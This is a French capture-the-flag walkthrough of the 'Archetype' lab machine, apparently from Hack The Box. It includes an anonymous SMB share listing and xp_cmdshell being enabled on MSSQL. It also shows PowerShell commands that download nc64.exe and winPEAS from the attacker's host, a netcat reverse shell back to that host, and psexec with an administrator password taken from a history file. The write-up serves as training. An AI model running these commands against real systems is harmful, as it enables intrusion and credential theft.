# GUIDE for Archetype.

## Task 1

Pour la premiere tache effectuons un simple nmap pour découvrir que le port TCP d'ecoute de la databse est le numéro 1433.

---
## Task 2

On nous demande de trouver le nom du partage non administrative via smb.

Pour ce faire on peut utilser `smbclient` en tapant la commande suivante

```bash
smbclient -N -L \\\\[IP]\\
```

Avec le `-N` on indique que l'on demande de ce connecter en tant qu'invité (sans mot de passe), et le `-L` fait une liste des partages disponible sur le serveur.
Les 4 `\` permettent d'ommetre le caractere barre oblique et permet aussi de faire référence à un serveur. 

Ainsi en faisant la commande, on obtiens une liste de sharename avec les quelles on vas pouvoir essayer de ce connecter.

---
## Task 3 

Pour suivre on vas pouvoir utiliser la meme commande sans le `-L` et ainsi ajouter a la fin de la commande l'un des sharename qui vas pouvoir nous donnée ainsi une vue sur ce qui est disponible pour chacun.

```bash
smbclient -N -L \\\\[IP]\\[sharename]
```
en essayant cela avec les sharename suivi d'un `$` on constate que les accés sont refusé cependant quant on execute la même commande avec bakups qui ne contient pas de `$` on ce retrouve connecter a une sorte de "desktop" (approximative le nom la, plutot un repository je pense).

Sur celui ci on ce retrouve a pouvoir faire quelque commande tel que `ls`.

Ainsi trois résultats apparaissent et un qui m'intérésse plus particulierement le `prod.dtsConfig`, dans le quelle en y regardant de plus pres je trouve la réponse a la task 3 qui est le mot de passe de l'utilisateur. (je ne le met pas ou cas ou quelqu'un trouve ce repos pour tricher)

---
## Task 4

Une petite recherche sur google avec la bonne question te donne la réponse!! Le script qui permet une connexion a un serveur msql miscrosoft est `mssqlclient.py`

---
## Task 5

Aprés avoir trouver le fameux `myssqlclient.py` je me suis mis a rechercher un moyen de l'utiliser je suis tomber sur un tuto trés intéréssant qui ma donné le lien d'un git hub pour `impacket` sur le quelle j'ai pu voir la procédure d'instalation de celui-ci.<br/>
<br/>
Afin de pouvoir me connecter au serveur sql une commande ma était fourni. On fait appel au script que l'on veut executer puis on entre l'id de l'utilisateur trouver lors de la manip précédente suivi d'un @ et de l'adresse IP cible, enfin on termine avec `-windows-auth` qui permet de préciser que c'est sur un serveur miscrosoft que nous allons nous connecter.

```bash
mssqlclient.py [ID]@[IP] -windows-auth
```

Une fois connecter a l'intérieur un `help` m'a ppermis de voir les commande disponible et la sans aucune logique j'ai trouver la réponse a la task 5 qui est `xp_cmdshell`. A ce stade je ne sais pas du tout a quoi sert cette commande.

---
## Task 6

Il y a un script qui peut nous permettre d'escalader les privilege sur un hote windows est celui ci est `WinPeas`

---
## Task 7 -- Task 8 -- Task 9

Avant toute chose nous allons reconfigurer la command xp_cmdshell pour pouvoir pour pouvoir faire des commande d'excution windows shell.<br/>
<br/>
Pour ce faire nous allons commencer avec `EXEC xp_cmdshell "net user"` pour voir si la commande est activer.<br/>
Dans ce cas elle ne l'est pas.<br/>
<br/>
Nous allons donc faire en sorte quelle soit disponible. <br/>
Nous allons commencer par taper la commande `EXEC sp_configure "show advanced options", 1;`, 1 pour true afin qu'elle s'affiche.<br/>
On continue avec `Reconfigure;` pour que cela soit pris en compte.<br/>
On peut les afficher pour verifier que ce la a bien était fait. Avec `sp_configure;`<br/>
Puis on termine avec `EXEC sp_configure 'xp_cmdshell', 1;`, on choisit la commande a reconfigurer puis on a la passe a 1 (true).<br/>
Et on termine avec un `RECONFIGURE;`, pour la pise en compte. <br/>
<br/>
Nous somme maintenant capable d'effetuer des command system. <br/>
<br/>


J'ai decouvert une façons bien plus simple qui consiste a, aprés avoir fais le `help`, <br/>
Il faut faire un `enable_xp_cmdshell`, <br/>
Puis un `RECONFIGURE`, ce qui vas passer le 0 false a 1 True et la commande sera donc accéssible. <br/>
<br/>

Maintenant que  ous avons les droit nous allons pouvoir essayer d'obtenir un reverse shell en créans un fichier dans un endroit ou l'on peut download un fichier. <br/>
Dans ce cas on peut dowload un fichier dans `C:\Users\sql_svc\Dowloads`. <br/>
Pour verifier que la commande que nous allons faire fonctionne on commence par ouvrir un server. dans le dossier qui contien notre `nc64.exe`. <br/>

```bash
python3 -m http.server 8000
```
Avec la commande:

```bash
xp_cmdshell "powershell -c cd C:\User\sql_svc\Dowloads; wget http://[my IP]:[our-listening-server-port]/nc64.exe -outfile nc64.exe";
```

Une fois la commande faite on peut constater sur la fenetre du serveur que nous avons ouvert qu'une requete a bien eu lieu! Cela signifie que notre téléchargement du fichier dans `C:\Users\sql_svc\Dowloads` a normalement bien était effectuer.

Comment avons nous vu le fichier dans le quelle on la télécharger 🤔? On a trouver un moyen de ce balader avec `xp_cmdshell`.
<br/>
Pour ce faire en essayant la commande:

```bash
xp_cmdshell "powershell -c pwd"
```
On recoit:

```bash
C:\Windows\System32
```
Vu qu'on reçois une réponse pourquoi pas essayer une commande qui permetrais de voir si on peut voir autre chose? Aprés quelque recherche intensive parce que clairement j'y connais rien 😫! J'essaye cette commande qui me permettrait de voir la racine de la machine cile, avec `dir` qui est l'équivalent de `ls`:

```bash
xp_cmdshell "powershell -c cd C:\; dir"
```

Je vois donc que je peut acceder ainsi a `Users` puis a `Dowloads` ainsi vu que l'on avait pas le droit d'ecriture dans la racine j'essai de télécharger le fichier que je veut vers cette destination. Et il s'avére que ceci a fonctionner donc on peut continuer!!! 😉



Une fois le fichier télécharger on envoi la procédure d'obtention de la command `cmd`. <br/>
Pour ce faire on vas ouvrir un net cat dans une nouvelle fenetre de terminal avec la commande:

```bash
nc -lvnp 443
```
Le port peut etre celui de votre choix tant qu'il est libre.<br/>
Combinaise de `-lvnp`:<br/>
`-l`: ce met en mode serveur et attend une connexion entrante <br/>
`-v`: ne pas résoudre les noms d'hotes ou les adresses IP <br/>
`-n`: ce met en mode verbeux <br/>
`-p`: précision du port a utiliser pour l'ecoute dans notre cas le port `443` <br/>
<br/>

Mainteant que ceci est fait on peut envoyer la demande de connexion a la commande `cmd`. Avec la commande:

```bash
xp_cmdshell "powershell -c cd C:\User\sql_svc\Dowloads; .\nc64.exe -e cmd.exe [our IP] [port d'ecoute nc]"
```

On précise le fichier a éxécuter `.\nc64.exe`, on utilise `-e` pour préciser la commande a éxécuter suite a la connexion et finalement `cmd.exe` la commande que l'on veut.

Et la magie opére nous somme connecter 🤯 🥳!!<br/>
<br/>
Maintenant que nous somme la lançons nous a la recherche des flag. Et on nous indique que le flag ce trouve dans le users desktop.<br/>
On trouve donc notre fichier:

```bash
C:\Users\sql_svc\Desktop
```

Ainsi aprés un `type user.txt` (type est l'équivalent de cat... 🥵) on découvre le user flag. <br/>

Partons a la recherche du root flag. <br/>


Je constate que je ne peut fair un `dir` sur :

```bash
C:\USers\Administrator>
```

Plus haut dans la box on nous parle de winPEAS qui permet l'escalade de privilege. <br/>
Sur google le premier lien sur le quel nous tombons et un repo git hub dans le quelle on peut trouver un fichier exe `winPEASex64.exe`. <br/>
Je decide donc de le télécharger puis d'ouvrir un serveur sur le port 8000, puis le télécharger sur la machine distante afin de pouvoir le run.

Je lance donc ces commandes depuis le répértoire Dowloads de la machine distante:

```bash
wget http://[Mon IP]/winPEASx64.exe -outfile winPEASx64.exe
```

La machine me retourne que je n'ai pas les droit adéquat, je lance donc la commande `powershell` et je recommence.<br/>
Ainsi le fichier grace au serveur que j'ai lancer, je peut voir qu'il a était télécharger avec succés.<br/>
Je lance donc la commande:

```bash
.\winPEASx64.exe
```
Le script ce lance wouhouuuuuu 😌!<br/><br/>

Que faire maintenant plusieur vulnérabilté sont détecter partons à la recherche de ce qui peut nous aider ... 😱 <br/><br/>
A la toute fin des données rendu par l'execution de winPEAS je constate qu'il y a un fichier nommé `Consolehosts_history.txt` qui peut étre readable!!!<br/>
Et encore un pas en avant avec la commande `type` j'ouvre ce fichier et découvre le mot de passe ADMINISTRATOR! <br/>
Mais comment l'utiliser ??? <br/><br/>
Je me dit que peut étre je peut utiliser la même procédure qu'avec l'utilisateur!<br/>
Je lance donc:

```bash
mssqlclient.py Administrator@[ip de la cible] --windows-auth
```

Naturellement ça ne fonctionne pas... 🤬<br/>

Clairement sans le walktrought je ne trouver pas la commande celle ci fait partie du impacket télécharger plutot qui fait parti du même package que mssqslclient.<br/>
Avec la commande: <br/>

```bash
psexec.py administrator@[adresse ip de la cible]
```
On rentre le code demander et enfin nous pouvons nous balader en tant qu'utilisateur root avec les droit qui nous permettent d'aller récupere le flag root!!!! 🎊🎊🎊





